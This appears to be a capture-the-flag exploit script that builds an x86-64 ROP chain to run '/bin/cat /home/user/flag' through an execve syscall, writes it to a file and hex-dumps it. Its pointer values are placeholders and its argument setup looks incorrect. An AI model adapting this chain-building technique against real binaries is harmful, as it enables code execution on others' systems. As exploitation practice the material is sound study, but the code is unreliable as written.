from struct import pack
import sys
import subprocess

# ultimately unused as I could just inject shellcode directly

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # f926be0d15cab61468f3470bb8a9b33607351d664950d5f64f305dee4707a43c
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += p(0x45086c) # 0x000000000045086c: pop rax; ret;
rop += p(59) # execve
rop += p(0x401716) # 0x0000000000401716: pop rdi; ret;
rop += p(0x99aabbccddeeff11) # pointer to /bin/cat string
rop += p(0x402a56) # 0x0000000000402a56: pop rsi; ret;
rop += p(0x1122334455667788) # pointer to /home/user/flag string
rop += p(0x44fd05) # 0x000000000044fd05: pop rdx; ret;
rop += p(0x0) # NULL envp
rop += p(0x40120f) # 0x000000000040120f: syscall;
rop += b'/bin/cat\0'
rop += b'/home/user/flag\0'

with open('rop', 'wb') as h:
    h.write(rop)

proc = subprocess.Popen(["xxd", "-i", "rop"])
proc.communicate()
sys.stdout.buffer.flush()
